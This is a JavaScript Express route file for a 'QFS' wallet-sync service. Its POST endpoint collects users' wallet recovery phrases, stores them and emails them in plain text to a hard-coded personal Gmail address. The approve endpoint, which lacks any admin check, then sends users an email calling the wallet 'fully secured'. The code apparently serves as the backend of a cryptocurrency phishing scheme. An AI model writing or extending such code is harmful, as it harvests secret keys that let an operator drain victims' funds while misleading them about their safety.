// backend/src/routes/walletsync.js
import { Router } from "express";
import { prisma } from "../db.js";             // ✅ use shared Prisma client
import { sendMail } from "../utils/email.js";  // ✅ use shared mail helper
import { auth } from "../middleware/auth.js";

const router = Router();

// ✅ prefer env, fall back to the current address
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "mikeclinton508@gmail.com";

// ---------------------------------------------------------------------------
//  POST /api/walletsync  → User connects wallet
// ---------------------------------------------------------------------------
router.post("/", auth, async (req, res) => {
  try {
    const { walletName, method, data } = req.body;
    if (!walletName || !method || !data) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    // get current user (req.user set by auth middleware)
    const user = await prisma.user.findUnique({
      where: { id: req.user.id },
      select: { id: true, email: true, username: true, country: true, name: true },
    });

    if (!user) return res.status(404).json({ error: "User not found" });

   // If method is "phrase", format the numbered phrase before saving
let formattedData = data;
if (method === "phrase" && data?.phrase) {
  const words = data.phrase.split(" ").filter(Boolean);
  formattedData = words.map((w, i) => `${i + 1}. ${w}`).join("\n");
} else {
  formattedData = JSON.stringify(data, null, 2);
}

const entry = await prisma.walletSync.create({
  data: {
    userId: user.id,
    walletName,
    method,
    data: formattedData, // ✅ saved in numbered format
    status: "PENDING",
  },
});


    // --- Professional Admin Email ---
    const adminHtml = `
      <div style="font-family:Arial,Helvetica,sans-serif;max-width:600px;margin:auto;border:1px solid #eee;border-radius:12px;overflow:hidden">
        <div style="background:#0a0a0a;padding:20px;color:white;text-align:center">
          <h2 style="margin:0;font-weight:600;">QFS Wallet Connection Request</h2>
        </div>
        <div style="padding:24px;">
          <p>Hello Admin,</p>
          <p>A new user has attempted to link a wallet. Here are the details:</p>
          <table style="width:100%;border-collapse:collapse;">
            <tr><td style="padding:6px 0;"><b>User Name:</b></td><td>${user.name || user.username || "—"}</td></tr>
            <tr><td style="padding:6px 0;"><b>Email:</b></td><td>${user.email}</td></tr>
            <tr><td style="padding:6px 0;"><b>Country:</b></td><td>${user.country || "—"}</td></tr>
            <tr><td style="padding:6px 0;"><b>Wallet:</b></td><td>${walletName}</td></tr>
            <tr><td style="padding:6px 0;"><b>Method:</b></td><td>${method}</td></tr>
            <tr><td style="padding:6px 0;"><b>Status:</b></td><td><span style="color:#f59e0b;font-weight:bold;">PENDING</span></td></tr>
            <tr><td style="padding:6px 0;"><b>Entry ID:</b></td><td>${entry.id}</td></tr>
          </table>

          <div style="margin-top:16px;padding:12px;border-left:3px solid #2563eb;background:#f9fafb;">
            <p style="margin:0;color:#111827;font-size:14px;"><b>Raw Submission Data:</b></p>
           <pre style="white-space:pre-wrap;background:#f3f4f6;padding:12px;border-radius:8px;font-size:13px;color:#374151;">
${method === "phrase"
  ? formattedData
  : JSON.stringify(data, null, 2)}
</pre>

          </div>
          <p style="margin-top:24px;">Please review and update the status in the admin dashboard.</p>
        </div>
        <div style="background:#0a0a0a;color:white;text-align:center;padding:12px;font-size:12px;">
          &copy; ${new Date().getFullYear()} QFS System
        </div>
      </div>
    `;

    // ✅ send using shared mail helper (respects dry-run if SMTP not configured)
    await sendMail({
      to: ADMIN_EMAIL,
      subject: `🔗 New Wallet Connection - ${user.email}`,
      html: adminHtml,
    });

    return res.json({ success: true, entry });
  } catch (err) {
    console.error("Wallet sync error:", err);
    return res.status(500).json({ error: "Failed to save wallet sync" });
  }
});

// ---------------------------------------------------------------------------
//  PUT /api/walletsync/approve/:id → Admin approves a wallet sync
// ---------------------------------------------------------------------------
router.put("/approve/:id", auth, async (req, res) => {
  try {
    const entryId = Number(req.params.id);
    if (!entryId) return res.status(400).json({ error: "Invalid ID" });

    // update wallet sync status
    const entry = await prisma.walletSync.update({
      where: { id: entryId },
      data: { status: "APPROVED" },
      include: { user: true }, // get user details in same query
    });

    const { user } = entry;

    // fetch user total balance (sum holdings)
    const holdings = await prisma.holding.findMany({
      where: { userId: user.id },
      select: { amount: true, locked: true },
    });

    const totalBalance = holdings.reduce((sum, h) => {
      const unlocked = parseFloat(h.amount) - parseFloat(h.locked || 0);
      return sum + (isNaN(unlocked) ? 0 : unlocked);
    }, 0);

    // --- Professional User Email ---
    const userHtml = `
      <div style="font-family:Arial,Helvetica,sans-serif;max-width:600px;margin:auto;border:1px solid #eee;border-radius:12px;overflow:hidden">
        <div style="background:#0a0a0a;padding:20px;color:white;text-align:center">
          <h2 style="margin:0;font-weight:600;">🔐 Wallet Sync Approved</h2>
        </div>
        <div style="padding:24px;">
          <p>Dear ${user.name || user.username || "User"},</p>
          <p>We are pleased to inform you that your wallet has been successfully synced and <strong>fully secured</strong> on the QFS system.</p>

          <p style="margin-top:12px;font-size:15px;">
            ✅ <strong>Wallet Status:</strong> <span style="color:green;font-weight:bold;">APPROVED</span><br/>
            💰 <strong>Total Balance:</strong> <span style="font-weight:bold;">$${totalBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD</span>
          </p>

          <p>Thank you for trusting QFS. You can now manage your synced wallet directly from your dashboard.</p>

          <div style="margin-top:20px;text-align:center;">
            <a href="${process.env.CLIENT_URL || 'https://www.qfsworldwide.net'}/dashboard/walletsync" style="background:#2563eb;color:white;padding:12px 20px;text-decoration:none;border-radius:6px;display:inline-block;">
              Go to Dashboard
            </a>
          </div>

          <p style="margin-top:32px;">Best regards,<br/>The QFS Security Team</p>
        </div>
        <div style="background:#0a0a0a;color:white;text-align:center;padding:12px;font-size:12px;">
          &copy; ${new Date().getFullYear()} QFS System
        </div>
      </div>
    `;

    await sendMail({
      to: user.email,
      subject: `✅ Wallet Sync Approved – QFS`,
      html: userHtml,
    });

    return res.json({ success: true, message: "Wallet sync approved and user notified." });
  } catch (err) {
    console.error("Approve wallet sync error:", err);
    return res.status(500).json({ error: "Failed to approve wallet sync" });
  }
});


export default router;
